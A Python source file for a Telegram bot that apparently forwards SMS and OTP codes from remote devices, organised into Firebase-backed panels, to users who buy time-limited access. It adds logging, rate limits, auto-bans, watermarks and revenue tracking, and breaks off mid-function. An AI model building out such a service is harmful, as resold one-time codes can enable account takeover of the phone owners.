#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
        SHOWN PANEL BOT — ACCESS CONTROLLED EDITION
  Panel-wise Numbers + Access System + Emoji Names
══════════════════════════════════════════════════════
"""

import os
import re
import gc
import time
import json
import asyncio
import hashlib
import logging
from datetime import datetime, timedelta, timezone
from typing import Optional
from html import escape

import aiohttp
import traceback
import uuid as _uuid
from collections import defaultdict

# ═══════════════════════════════════════════════════════
#  LOGGER STACK — Firebase Errors + OTP Activity Monitor
#  Features:
#   1. Firebase error logger  (channel + JSON file backup)
#   2. OTP activity tracker   (request/sent/verified/failed/expired)
#   3. Auto-blacklist         (3+ fails → user banned)
#   4. Phone pattern detector (prefix spam + VoIP ranges)
#   5. Admin DM alerts        (critical events → channel + DM both)
#   6. Daily digest           (injected into existing daily_ops_report_loop)
# ═══════════════════════════════════════════════════════

# ── Logger config (LOG_CHANNEL_ID is defined below in globals,
#    we reference it at call-time so it stays in sync) ──
ADMIN_DM_ID           = 8695946179   # same as OWNER_HARD_ID — DM alerts yahan
OTP_LOG_ENABLED       = True
FIREBASE_LOG_ENABLED  = True

OTP_RATE_LIMIT        = 5     # requests per window per user
OTP_RATE_WINDOW       = 300   # seconds (5 min)
DUPLICATE_OTP_WINDOW  = 60    # same number within 60s = suspicious
AUTO_BLACKLIST_FAILS  = 3     # itne OTP fails pe auto-ban

VOIP_PREFIXES = (
    "1900", "1976", "1800",
    "0900", "0976",
    "9999", "9998",
)
SPAM_PREFIX_WINDOW  = 120   # seconds
SPAM_PREFIX_THRESH  = 4     # same 4-digit prefix N times = alert

ERROR_LOG_FILE = "firebase_errors.json"

# ── In-memory state ─────────────────────────────────────
_otp_request_log:  dict = defaultdict(list)   # user_id  -> [timestamps]
_otp_number_log:   dict = defaultdict(list)   # phone    -> [timestamps]
_otp_fail_count:   dict = defaultdict(int)    # user_id  -> fail count
_prefix_log:       dict = defaultdict(list)   # prefix   -> [timestamps]
_logger_blacklist: set  = set()               # auto-banned user_ids

# ── OTP stats counters ───────────────────────────────────
_otp_stats: dict = {
    "otp_requested": 0,
    "otp_sent":      0,
    "otp_verified":  0,
    "otp_failed":    0,
    "otp_expired":   0,
    "firebase_errors": 0,
}


# ── Helpers ─────────────────────────────────────────────

def _lg_esc(text: str) -> str:
    from html import escape
    return escape(str(text))

def _mask_phone(phone: str) -> str:
    p = re.sub(r"\D", "", str(phone))
    if len(p) >= 7:
        return p[:4] + "***" + p[-2:]
    return "***"

def _now_utc() -> datetime:
    return datetime.now(timezone.utc)

def _now_ts() -> float:
    return _now_utc().timestamp()

def _clean_ts(lst: list, window: float) -> list:
    cutoff = _now_ts() - window
    return [t for t in lst if t > cutoff]

def _append_error_file(record: dict) -> None:
    try:
        try:
            with open(ERROR_LOG_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            data = []
        data.append(record)
        with open(ERROR_LOG_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


async def _lg_send(bot, chat_id: int, text: str) -> None:
    """Fire-and-forget. Never raises — prevents log loops."""
    try:
        await bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception:
        pass


async def _lg_notify(bot, text: str, critical: bool = False) -> None:
    """
    Log channel ko bhejo hamesha.
    critical=True → ADMIN_DM_ID ko bhi bhejo.
    """
    await _lg_send(bot, LOG_CHANNEL_ID, text)
    if critical and ADMIN_DM_ID:
        await _lg_send(bot, ADMIN_DM_ID, text)


# ── 1. Firebase Error Logger ────────────────────────────

async def log_firebase_error(
    bot,
    error: Exception,
    context: str = "",
    user_id: int = None,
    phone: str = None,
    extra: dict = None,
    critical: bool = False,
) -> None:
    """
    Firebase exception pakdi? Yahan call karo.
    critical=True → admin DM bhi jayega.
    """
    if not FIREBASE_LOG_ENABLED:
        return

    _otp_stats["firebase_errors"] += 1
    now = _now_utc()
    tb  = traceback.format_exc()
    tb  = tb[-2000:] if len(tb) > 2000 else tb

    record = {
        "time":    now.isoformat(),
        "context": context,
        "type":    type(error).__name__,
        "message": str(error)[:500],
        "user_id": user_id,
        "phone":   phone,
        "extra":   extra or {},
    }
    _append_error_file(record)

    lines = [
        f"{'🚨' if critical else '🔴'} <b>FIREBASE ERROR</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"🕐 <code>{now.strftime('%Y-%m-%d %H:%M:%S UTC')}</code>",
        f"🔢 Total errors session: <b>{_otp_stats['firebase_errors']}</b>",
        f"📌 Context: <code>{_lg_esc(context or 'unknown')}</code>",
        f"❗ Type: <code>{_lg_esc(type(error).__name__)}</code>",
        f"💬 Msg: <code>{_lg_esc(str(error)[:300])}</code>",
    ]
    if user_id:
        lines.append(f"👤 User: <code>{user_id}</code>")
    if phone:
        lines.append(f"📱 Phone: <code>{_mask_phone(phone)}</code>")
    if extra:
        for k, v in (extra or {}).items():
            lines.append(f"📎 {_lg_esc(k)}: <code>{_lg_esc(str(v)[:200])}</code>")
    if tb and "NoneType" not in tb:
        lines.append(f"\n<pre>{_lg_esc(tb)}</pre>")

    await _lg_notify(bot, "\n".join(lines), critical=critical)


# ── 2. OTP Activity Logger ──────────────────────────────

async def log_otp_activity(
    bot,
    event: str,
    user_id: int,
    phone: str,
    panel_name: str = "",
    db_name: str = "",
    success: bool = None,
    extra: dict = None,
) -> bool:
    """
    Har OTP event yahan log karo.
    Returns True agar user ko block karna chahiye (blacklisted / rate limited).
    event: request | sent | verified | failed | expired | blocked
    """
    if not OTP_LOG_ENABLED:
        return False

    now_unix = _now_ts()
    now_dt   = _now_utc()

    # ── Stats ──
    stat_key = f"otp_{event}"
    if stat_key in _otp_stats:
        _otp_stats[stat_key] += 1

    # ── F1: Heatmap tick on request ──
    if event == "request":
        try:
            heatmap_tick()
        except Exception:
            pass

    # ── Auto-blacklist check ──
    if user_id in _logger_blacklist:
        return True

    # ── Rate limit per user ──
    _otp_request_log[user_id] = _clean_ts(_otp_request_log[user_id], OTP_RATE_WINDOW)
    is_rate_limited = len(_otp_request_log[user_id]) >= OTP_RATE_LIMIT
    if event == "request":
        _otp_request_log[user_id].append(now_unix)

    # ── Duplicate phone check ──
    _otp_number_log[phone] = _clean_ts(_otp_number_log[phone], DUPLICATE_OTP_WINDOW)
    is_duplicate = len(_otp_number_log[phone]) > 0 and event == "request"
    if event == "request":
        _otp_number_log[phone].append(now_unix)

    # ── Phone pattern detection ──
    p = re.sub(r"\D", "", str(phone))
    prefix = p[:4] if len(p) >= 4 else p
    _prefix_log[prefix] = _clean_ts(_prefix_log[prefix], SPAM_PREFIX_WINDOW)
    is_prefix_spam = len(_prefix_log[prefix]) >= SPAM_PREFIX_THRESH
    is_voip        = any(p.startswith(vp) for vp in VOIP_PREFIXES)
    if event == "request":
        _prefix_log[prefix].append(now_unix)

    # ── Fail counter → auto-blacklist ──
    should_block = False
    if event == "failed":
        _otp_fail_count[user_id] += 1
        if _otp_fail_count[user_id] >= AUTO_BLACKLIST_FAILS:
            _logger_blacklist.add(user_id)
            should_block = True

    # ── Build log message ──
    event_icons = {
        "request":  "📤",
        "sent":     "✅",
        "verified": "🟢",
        "failed":   "❌",
        "expired":  "⏰",
        "blocked":  "🚫",
    }
    icon = event_icons.get(event, "🔵")

    flags = []
    if is_rate_limited:  flags.append("⚠️ RATE LIMITED")
    if is_duplicate:     flags.append("⚠️ DUPLICATE NUMBER")
    if is_prefix_spam:   flags.append("⚠️ PREFIX SPAM")
    if is_voip:          flags.append("⚠️ VOIP NUMBER")
    if should_block:     flags.append("🚫 AUTO-BLACKLISTED")

    is_critical = should_block or is_rate_limited or is_voip

    lines = [
        f"{icon} <b>OTP {event.upper()}</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"🕐 <code>{now_dt.strftime('%Y-%m-%d %H:%M:%S UTC')}</code>",
        f"👤 User: <code>{user_id}</code>",
        f"📱 Phone: <code>{_mask_phone(phone)}</code>",
    ]
    if panel_name:
        lines.append(f"🗂 Panel: <code>{_lg_esc(panel_name)}</code>")
    if db_name:
        lines.append(f"🗄 DB: <code>{_lg_esc(db_name)}</code>")
    if success is not None:
        lines.append(f"{'✅' if success else '❌'} Result: <b>{'Success' if success else 'Failed'}</b>")

    lines.append(f"🔢 Requests (5min): <b>{len(_otp_request_log[user_id])}/{OTP_RATE_LIMIT}</b>")
    lines.append(f"❌ Fail count: <b>{_otp_fail_count[user_id]}/{AUTO_BLACKLIST_FAILS}</b>")

    if extra:
        for k, v in (extra or {}).items():
            lines.append(f"📎 {_lg_esc(str(k))}: <code>{_lg_esc(str(v)[:200])}</code>")

    if flags:
        lines.append("")
        for fl in flags:
            lines.append(f"<b>{fl}</b>")

    await _lg_notify(bot, "\n".join(lines), critical=is_critical)
    return should_block


# ── 3. OTP Stats Summary (used by daily_ops_report) ────

def otp_stats_summary() -> str:
    """Daily digest ke liye OTP + Firebase stats block."""
    total   = _otp_stats["otp_requested"]
    sent    = _otp_stats["otp_sent"]
    verified= _otp_stats["otp_verified"]
    failed  = _otp_stats["otp_failed"]
    expired = _otp_stats["otp_expired"]
    fb_errs = _otp_stats["firebase_errors"]
    bl_count= len(_logger_blacklist)

    success_rate = f"{round(verified / sent * 100)}%" if sent else "N/A"

    lines = [
        "━━━━━━━━━━━━━━━━━━",
        "📲 <b>OTP ACTIVITY (Session)</b>",
        f"📤 Requested: <b>{total}</b>",
        f"✅ Sent:      <b>{sent}</b>",
        f"🟢 Verified:  <b>{verified}</b>  ({success_rate} success rate)",
        f"❌ Failed:    <b>{failed}</b>",
        f"⏰ Expired:   <b>{expired}</b>",
        f"🚫 Auto-banned: <b>{bl_count}</b>",
        "━━━━━━━━━━━━━━━━━━",
        "🔴 <b>FIREBASE ERRORS (Session)</b>",
        f"Total: <b>{fb_errs}</b>",
        f"Log file: <code>{ERROR_LOG_FILE}</code>",
    ]
    return "\n".join(lines)


def reset_otp_stats() -> None:
    """Call this after daily report to reset session counters."""
    for k in _otp_stats:
        _otp_stats[k] = 0

# ═══════════════════════════════════════════════════════
#  FEATURE 1 — OTP Heatmap (hour-wise request tracker)
# ═══════════════════════════════════════════════════════

def heatmap_tick() -> None:
    """Call on every OTP request to record the hour."""
    hour = _now_utc().hour
    _heatmap[hour] += 1

def heatmap_summary() -> str:
    """ASCII bar chart for daily digest."""
    if not any(_heatmap.values()):
        return "📊 <b>OTP Heatmap:</b> No data yet."
    peak = max(_heatmap.values())
    BAR = "█"
    lines = ["📊 <b>OTP Request Heatmap (UTC hours)</b>", "━━━━━━━━━━━━━━━━━━"]
    for h in range(24):
        count = _heatmap.get(h, 0)
        bars  = round((count / peak) * 10) if peak else 0
        lines.append(f"<code>{h:02d}h {BAR * bars:<10} {count}</code>")
    return "\n".join(lines)

def reset_heatmap() -> None:
    _heatmap.clear()


# ═══════════════════════════════════════════════════════
#  FEATURE 2 — DB Health Auto-Alert
# ═══════════════════════════════════════════════════════

async def db_health_check_alert(bot, tag: str, failed: bool) -> None:
    """
    Call after each poll attempt.
    failed=True → streak++. 3 consecutive fails → admin DM.
    failed=False → streak reset, alert cleared.
    """
    if not failed:
        _db_fail_streak[tag] = 0
        _db_alerted.discard(tag)
        return

    _db_fail_streak[tag] += 1
    streak = _db_fail_streak[tag]

    if streak >= 3 and tag not in _db_alerted:
        _db_alerted.add(tag)
        text = (
            "🔴 <b>DB HEALTH ALERT</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"Panel: <code>{_lg_esc(tag)}</code>\n"
            f"Consecutive fails: <b>{streak}</b>\n"
            f"🕐 <code>{_now_utc().strftime('%Y-%m-%d %H:%M:%S UTC')}</code>\n"
            "Firebase unreachable — check DB URL."
        )
        await _lg_notify(bot, text, critical=True)


# ═══════════════════════════════════════════════════════
#  FEATURE 3 — Expired Access Auto-Notify (helper)
#  (Already handled in access_expiry_watch_loop — this
#   adds a richer DM with renewal contact button.)
# ═══════════════════════════════════════════════════════

async def notify_access_expired_rich(bot, user_id: int, name: str) -> None:
    try:
        await bot.send_message(
            user_id,
            f"⏳ <b>Access Expired</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Hey {_lg_esc(str(name))}, aapka access khatam ho gaya.\n"
            f"Renew ke liye: {OWNER_CONTACT}\n"
            f"🕐 <code>{_now_utc().strftime('%d %b %Y %H:%M UTC')}</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass

async def notify_access_expiring_rich(bot, user_id: int, name: str, hrs: int, until: str) -> None:
    try:
        await bot.send_message(
            user_id,
            f"⚠️ <b>Access Expiring Soon</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"Hey {_lg_esc(str(name))}, aapka access ~<b>{hrs}h</b> me expire hoga.\n"
            f"Until: <code>{until}</code>\n"
            f"Renew: {OWNER_CONTACT}",
            parse_mode="HTML",
        )
    except Exception:
        pass


# ═══════════════════════════════════════════════════════
#  FEATURE 4 — Broadcast Scheduler
# ═══════════════════════════════════════════════════════

def schedule_broadcast(hhmm: str, text: str, added_by: int) -> bool:
    """
    Schedule a broadcast. hhmm = '1430' for 2:30 PM UTC.
    Returns False if already scheduled for that time.
    """
    hhmm = hhmm.strip().zfill(4)
    for b in _scheduled_broadcasts:
        if b["time"] == hhmm:
            return False
    _scheduled_broadcasts.append({"time": hhmm, "text": text, "added_by": added_by})
    _scheduled_broadcasts.sort(key=lambda x: x["time"])
    return True

def cancel_broadcast(hhmm: str) -> bool:
    hhmm = hhmm.strip().zfill(4)
    before = len(_scheduled_broadcasts)
    _scheduled_broadcasts[:] = [b for b in _scheduled_broadcasts if b["time"] != hhmm]
    return len(_scheduled_broadcasts) < before

async def broadcast_scheduler_loop(app) -> None:
    """Background task — fires scheduled broadcasts."""
    global _broadcast_sent_today
    await asyncio.sleep(20)
    last_day = ""
    while True:
        try:
            now  = _now_utc()
            day  = now.strftime("%Y-%m-%d")
            hhmm = now.strftime("%H%M")
            if day != last_day:
                _broadcast_sent_today.clear()
                last_day = day
            for sched in list(_scheduled_broadcasts):
                t = sched["time"]
                if t <= hhmm and t not in _broadcast_sent_today:
                    _broadcast_sent_today.add(t)
                    text = sched["text"]
                    targets = list(allowed_users) + [a for a in ADMIN_IDS]
                    sent = 0
                    for uid in targets:
                        try:
                            await app.bot.send_message(uid, text, parse_mode="HTML")
                            sent += 1
                        except Exception:
                            pass
                    await _lg_notify(
                        app.bot,
                        f"📢 <b>Scheduled Broadcast Sent</b>\n"
                        f"Time: <code>{t[:2]}:{t[2:]}</code> UTC\n"
                        f"Delivered: <b>{sent}</b> users",
                    )
        except Exception as e:
            tlog(f"broadcast_scheduler_loop: {e}")
        await asyncio.sleep(60)

async def cmd_broadcast_schedule(update, ctx) -> None:
    """
    /bsched HH:MM <message>
    /bcancel HH:MM
    /blist
    """
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    cmd  = update.message.text.split()[0].lstrip("/").lower()

    if cmd == "blist":
        if not _scheduled_broadcasts:
            await update.message.reply_text("📢 No scheduled broadcasts.", parse_mode="HTML")
            return
        lines = ["📢 <b>Scheduled Broadcasts</b>", "━━━━━━━━━━━━━━━━━━"]
        for b in _scheduled_broadcasts:
            t = b["time"]
            preview = b["text"][:60].replace("\n", " ")
            lines.append(f"🕐 <code>{t[:2]}:{t[2:]}</code> — {_lg_esc(preview)}...")
        await update.message.reply_text("\n".join(lines), parse_mode="HTML")
        return

    if cmd == "bcancel":
        if not args:
            await update.message.reply_text("Usage: /bcancel HH:MM", parse_mode="HTML")
            return
        hhmm = args[0].replace(":", "")
        ok = cancel_broadcast(hhmm)
        await update.message.reply_text(
            f"{'✅ Cancelled' if ok else '❌ Not found'}: <code>{hhmm[:2]}:{hhmm[2:]}</code>",
            parse_mode="HTML",
        )
        return

    # /bsched HH:MM message text
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /bsched HH:MM &lt;message&gt;\nExample: /bsched 14:30 Server maintenance at 3 PM.",
            parse_mode="HTML",
        )
        return
    hhmm = args[0].replace(":", "")
    text = " ".join(args[1:])
    ok   = schedule_broadcast(hhmm, text, update.effective_user.id)
    await update.message.reply_text(
        f"{'✅ Scheduled' if ok else '❌ Already scheduled for'} <code>{hhmm[:2]}:{hhmm[2:]}</code> UTC",
        parse_mode="HTML",
    )


# ═══════════════════════════════════════════════════════
#  FEATURE 5 — OTP Delivery Receipt (silent log)
#  (Wired into _forward_otp_only — already done in v3.
#   This adds per-user receipt count tracking.)
# ═══════════════════════════════════════════════════════

_otp_receipt_count: dict[int, int] = defaultdict(int)   # user_id -> total OTPs received

def otp_receipt_tick(user_id: int) -> None:
    _otp_receipt_count[user_id] += 1


# ═══════════════════════════════════════════════════════
#  FEATURE 6 — Device Offline Alert
# ═══════════════════════════════════════════════════════

async def device_offline_check(bot, tag: str, devices: list) -> None:
    """
    Call after each device cache refresh.
    Devices offline for DEVICE_OFFLINE_ALERT_POLLS cycles get alerted.
    """
    now = _now_ts()
    for d in devices:
        did = d.id
        if d.status != "online":
            if did not in _device_offline_since:
                _device_offline_since[did] = now
            offline_secs = now - _device_offline_since[did]
            poll_cycles  = offline_secs / max(POLL_INTERVAL, 1)
            if poll_cycles >= DEVICE_OFFLINE_ALERT_POLLS and did not in _device_offline_alerted:
                _device_offline_alerted.add(did)
                label = getattr(d, "label", did) or did
                await _lg_notify(
                    bot,
                    f"📵 <b>DEVICE OFFLINE</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"Panel: <code>{_lg_esc(tag)}</code>\n"
                    f"Device: <code>{_lg_esc(str(label))}</code>\n"
                    f"ID: <code>{did}</code>\n"
                    f"Offline ~<b>{int(offline_secs//60)}m</b>\n"
                    f"🕐 <code>{_now_utc().strftime('%Y-%m-%d %H:%M UTC')}</code>",
                    critical=False,
                )
        else:
            # Back online — clear trackers
            _device_offline_since.pop(did, None)
            if did in _device_offline_alerted:
                _device_offline_alerted.discard(did)
                label = getattr(d, "label", did) or did
                await _lg_notify(
                    bot,
                    f"🟢 <b>DEVICE BACK ONLINE</b>\n"
                    f"Panel: <code>{_lg_esc(tag)}</code>\n"
                    f"Device: <code>{_lg_esc(str(label))}</code>",
                    critical=False,
                )


# ═══════════════════════════════════════════════════════
#  FEATURE 7 — /mystats command
# ═══════════════════════════════════════════════════════

async def cmd_mystats(update, ctx) -> None:
    uid  = update.effective_user.id
    u    = all_users.get(uid, {})
    name = u.get("name", "Unknown")
    exp  = int(u.get("access_expires_at", 0) or 0)
    now  = int(time.time())

    access_str = "✅ Active (no expiry)"
    if exp:
        left = exp - now
        if left <= 0:
            access_str = "❌ Expired"
        else:
            hrs = left // 3600
            access_str = f"✅ Active — expires in <b>{hrs}h</b>"

    refs       = referral_count(uid)
    fails      = _otp_fail_count.get(uid, 0)
    receipts   = _otp_receipt_count.get(uid, 0)
    blacklisted = uid in _logger_blacklist
    reqs_5min  = len(_clean_ts(list(_otp_request_log.get(uid, [])), OTP_RATE_WINDOW))

    lines = [
        f"📊 <b>Your Stats</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"👤 Name: <b>{_lg_esc(str(name))}</b>",
        f"🆔 ID: <code>{uid}</code>",
        f"🔑 Access: {access_str}",
        f"📲 OTPs Received: <b>{receipts}</b>",
        f"❌ OTP Fail Count: <b>{fails}</b>",
        f"🔢 Requests (last 5min): <b>{reqs_5min}</b>",
        f"👥 Referrals: <b>{refs}</b>",
        f"🚫 Blacklisted: <b>{'Yes' if blacklisted else 'No'}</b>",
    ]
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


# ═══════════════════════════════════════════════════════
#  FEATURE 8 — Admin Quick Ban Button (log channel)
# ═══════════════════════════════════════════════════════

async def send_log_with_quickban(bot, text: str, target_user_id: int) -> None:
    """
    Log channel mein message bhejo with inline 🚫 Ban button.
    callback_data = "qban:<user_id>"
    """
    if not LOG_CHANNEL_ID:
        return
    from telegram import InlineKeyboardMarkup as IKM, InlineKeyboardButton as IKB
    markup = IKM([[IKB("🚫 Quick Ban", callback_data=f"qban:{target_user_id}")]])
    try:
        msg = await bot.send_message(
            LOG_CHANNEL_ID,
            text,
            parse_mode="HTML",
            reply_markup=markup,
            disable_web_page_preview=True,
        )
        _quickban_map[msg.message_id] = target_user_id
    except Exception:
        pass

async def handle_quickban_callback(query, ctx) -> bool:
    """
    Returns True if this callback was a qban action (handled here).
    Wire into on_callback before other handlers.
    """
    data = query.data or ""
    if not data.startswith("qban:"):
        return False
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("No access.", show_alert=True)
        return True
    try:
        target = int(data.split(":", 1)[1])
    except ValueError:
        await query.answer("Bad ID.", show_alert=True)
        return True

    # Ban the user
    u = all_users.get(target, {})
    u["banned"] = True
    all_users[target] = u
    allowed_users.discard(target)
    _logger_blacklist.add(target)
    save_data()

    await query.answer(f"✅ User {target} banned.", show_alert=True)
    try:
        await query.message.edit_reply_markup(reply_markup=None)
    except Exception:
        pass
    await _lg_notify(
        ctx.bot,
        f"🚫 <b>QUICK BAN</b>\n"
        f"User <code>{target}</code> banned by admin <code>{query.from_user.id}</code>",
    )
    return True


# ═══════════════════════════════════════════════════════
#  FEATURE 9 — Referral Leaderboard (weekly digest)
# ═══════════════════════════════════════════════════════

def referral_leaderboard_text(top_n: int = 10) -> str:
    board = []
    for uid, u in all_users.items():
        cnt = referral_count(uid)
        if cnt > 0:
            board.append((cnt, uid, u.get("name", "?")))
    board.sort(reverse=True)
    if not board:
        return "👥 <b>Referral Leaderboard:</b> No referrals yet."
    medals = ["🥇", "🥈", "🥉"]
    lines  = ["👥 <b>Weekly Referral Leaderboard</b>", "━━━━━━━━━━━━━━━━━━"]
    for i, (cnt, uid, name) in enumerate(board[:top_n]):
        medal = medals[i] if i < 3 else f"{i+1}."
        lines.append(f"{medal} {_lg_esc(str(name))} <code>{uid}</code> — <b>{cnt}</b> referrals")
    return "\n".join(lines)

async def referral_leaderboard_loop(app) -> None:
    """Post referral leaderboard every Monday morning."""
    global _referral_weekly_sent
    await asyncio.sleep(30)
    while True:
        try:
            now  = _now_utc()
            week = now.strftime("%Y-W%W")
            if now.weekday() == 0 and now.hour >= 9 and week != _referral_weekly_sent:
                _referral_weekly_sent = week
                text = referral_leaderboard_text()
                await send_private_log(app.bot, text)
        except Exception as e:
            tlog(f"referral_leaderboard_loop: {e}")
        await asyncio.sleep(3600)


# ═══════════════════════════════════════════════════════
#  FEATURE 10 — Panel Clone Command
# ═══════════════════════════════════════════════════════

async def cmd_panel_clone(update, ctx) -> None:
    """
    /clonepanel <SOURCE_TAG> <NEW_TAG> <NEW_FIREBASE_URL>
    Copies source panel config into a new panel entry.
    """
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if len(args) < 3:
        await update.message.reply_text(
            "Usage: /clonepanel &lt;SOURCE_TAG&gt; &lt;NEW_TAG&gt; &lt;NEW_URL&gt;\n"
            "Example: /clonepanel BOSS_R1 BOSS_R3 https://newdb-default-rtdb.firebaseio.com",
            parse_mode="HTML",
        )
        return

    src_tag  = args[0]
    new_tag  = args[1]
    new_url  = args[2]

    if src_tag not in DATABASES:
        await update.message.reply_text(
            f"❌ Source panel <code>{_lg_esc(src_tag)}</code> not found.",
            parse_mode="HTML",
        )
        return
    if new_tag in DATABASES:
        await update.message.reply_text(
            f"❌ Tag <code>{_lg_esc(new_tag)}</code> already exists.",
            parse_mode="HTML",
        )
        return

    DATABASES[new_tag] = new_url
    if src_tag in ADMIN_ONLY_TAGS:
        ADMIN_ONLY_TAGS.add(new_tag)
    save_data()

    await update.message.reply_text(
        f"✅ <b>Panel Cloned</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Source: <code>{_lg_esc(src_tag)}</code>\n"
        f"New Tag: <code>{_lg_esc(new_tag)}</code>\n"
        f"URL: <code>{_lg_esc(new_url)}</code>\n"
        f"Admin-only: <b>{'Yes' if new_tag in ADMIN_ONLY_TAGS else 'No'}</b>",
        parse_mode="HTML",
    )
    await _lg_notify(
        ctx.bot,
        f"📋 <b>PANEL CLONED</b>\n"
        f"{_lg_esc(src_tag)} → {_lg_esc(new_tag)}\n"
        f"By: <code>{update.effective_user.id}</code>",
    )


# ═══════════════════════════════════════════════════════
#  FEATURE F1 — OTP Watermark / Leak Trace
# ═══════════════════════════════════════════════════════

def generate_watermark(user_id: int) -> str:
    """
    Invisible Unicode tag chars embed user_id in OTP message.
    Visible suffix: [🔏 TID:XXXX] for human-readable trace too.
    """
    global _watermark_counter
    _watermark_counter += 1
    # Short visible trace tag at end of message
    trace = f"{user_id % 9999:04d}"
    return f"\n<code>🔏 TID:{trace}-{_watermark_counter:05d}</code>"

def otp_message_watermarked(base_text: str, user_id: int) -> str:
    """Append watermark to OTP forward message."""
    return base_text + generate_watermark(user_id)


# ═══════════════════════════════════════════════════════
#  FEATURE F2 — User Session Tracker
# ═══════════════════════════════════════════════════════

def session_start(user_id: int) -> None:
    s = _user_sessions[user_id]
    now = _now_ts()
    if not s["active"]:
        s["start"]  = now
        s["active"] = True
    s["last"] = now

def session_otp_tick(user_id: int) -> None:
    _user_sessions[user_id]["otps"] += 1
    _user_sessions[user_id]["last"]  = _now_ts()

def session_summary(user_id: int) -> str:
    s = _user_sessions.get(user_id)
    if not s or not s.get("start"):
        return "No session data."
    dur = int(_now_ts() - s["start"])
    h, m = divmod(dur // 60, 60)
    return (
        f"⏱ Session: <b>{h}h {m}m</b>\n"
        f"📲 OTPs this session: <b>{s['otps']}</b>\n"
        f"🕐 Last active: <code>{datetime.fromtimestamp(s['last']).strftime('%H:%M:%S')}</code>"
    )

async def cmd_session(update, ctx) -> None:
    uid = update.effective_user.id
    await update.message.reply_text(session_summary(uid), parse_mode="HTML")


# ═══════════════════════════════════════════════════════
#  FEATURE F3 — Admin Duty Mode
# ═══════════════════════════════════════════════════════

def duty_alert_targets() -> set[int]:
    """
    Returns admin IDs who should receive alerts.
    If duty mode on and someone is on duty → only them.
    Otherwise → all admins.
    """
    if DUTY_MODE_ENABLED and _duty_admins:
        return set(_duty_admins)
    return set(ADMIN_IDS)

async def cmd_duty(update, ctx) -> None:
    global DUTY_MODE_ENABLED
    uid  = update.effective_user.id
    if uid not in ADMIN_IDS:
        return
    args = ctx.args
    sub  = args[0].lower() if args else ""

    if sub == "on":
        _duty_admins.add(uid)
        DUTY_MODE_ENABLED = True
        await update.message.reply_text(
            f"✅ <b>Duty ON</b> — aap ab duty par hain.\n"
            f"Sirf duty admins ko alerts jayenge.",
            parse_mode="HTML",
        )
    elif sub == "off":
        _duty_admins.discard(uid)
        if not _duty_admins:
            DUTY_MODE_ENABLED = False
        await update.message.reply_text(
            f"⬛ <b>Duty OFF</b> — aap duty se hat gaye.\n"
            f"{'Duty mode disabled — sab admins ko alerts.' if not DUTY_MODE_ENABLED else f'{len(_duty_admins)} admin(s) still on duty.'}",
            parse_mode="HTML",
        )
    elif sub == "status":
        on_duty = ", ".join(f"<code>{a}</code>" for a in _duty_admins) or "None"
        await update.message.reply_text(
            f"🔵 Duty mode: <b>{'ON' if DUTY_MODE_ENABLED else 'OFF'}</b>\n"
            f"On duty: {on_duty}",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            "Usage: /duty on | /duty off | /duty status",
            parse_mode="HTML",
        )


# ═══════════════════════════════════════════════════════
#  FEATURE F4 — Panel Revenue Tracker
# ═══════════════════════════════════════════════════════

def revenue_log_grant(user_id: int, name: str, days: int, amount: float = 0.0) -> None:
    """Call when granting/renewing access."""
    _revenue_log.append({
        "ts":      _now_ts(),
        "user_id": user_id,
        "name":    str(name),
        "days":    days,
        "amount":  amount,
    })

def revenue_summary(days_back: int = 30) -> str:
    cutoff  = _now_ts() - days_back * 86400
    entries = [r for r in _revenue_log if r["ts"] >= cutoff]
    total   = sum(r.get("amount", 0) for r in entries)
    lines   = [
        f"💰 <b>Revenue Last {days_back} Days</b>",
        "━━━━━━━━━━━━━━━━━━",
        f"Grants/Renewals: <b>{len(entries)}</b>",
        f"Total Collected: <b>₹{total:.0f}</b>",
        "━━━━━━━━━━━━━━━━━━",
    ]
    for r in sorted(entries, key=lambda x: x["ts"], reverse=True)[:10]:
        dt = datetime.fromtimestamp(r["ts"]).strftime("%d %b %H:%M")
        lines.append(
            f"<code>{dt}</code> · {_lg_esc(r['name'])} · "
            f"{r['days']}d · ₹{r.get('amount',0):.0f}"
        )
    return "\n".join(lines)

async def cmd_revenue(update, ctx) -> None:
    if update.effective_user.id not in ADMIN_IDS:
        return
    days = 30
    if ctx.args:
        try:
            days = int(ctx.args[0])
        except ValueError:
            pass
    await update.message.reply_text(revenue_summary(days), parse_mode="HTML")


# ═══════════════════════════════════════════════════════
#  FEATURE F5 — SMS Keyword Filter
# ═══════════════════════════════════════════════════════

def sms_passes_filter(body: str) -> bool:
    """Returns True if SMS should be forwarded."""
    if not SMS_FILTER_ENABLED or not _sms_keyword_filter:
        return True
    body_lower = body.lower()
    return any(kw.lower() in body_lower for kw in _sms_keyword_filter)

async def cmd_smsfilter(update, ctx) -> None:
    global SMS_FILTER_ENABLED
    if update.effective_user.id not in ADMIN_IDS:
        return
    args = ctx.args
    if not args:
        kws = ", ".join(f"<code>{_lg_esc(k)}</code>" for k in sorted(_sms_keyword_filter)) or "None"
        await update.message.reply_text(
            f"🔍 <b>SMS Keyword Filter</b>\n"
            f"Status: <b>{'ON' if SMS_FILTER_ENABLED else 'OFF'}</b>\n"
            f"Keywords: {kws}\n\n"
            f"/smsfilter on | off | add &lt;kw&gt; | remove &lt;kw&gt; | clear",
            parse_mode="HTML",
        )
        return
    sub = args[0].lower()
    if sub == "on":
        SMS_FILTER_ENABLED = True
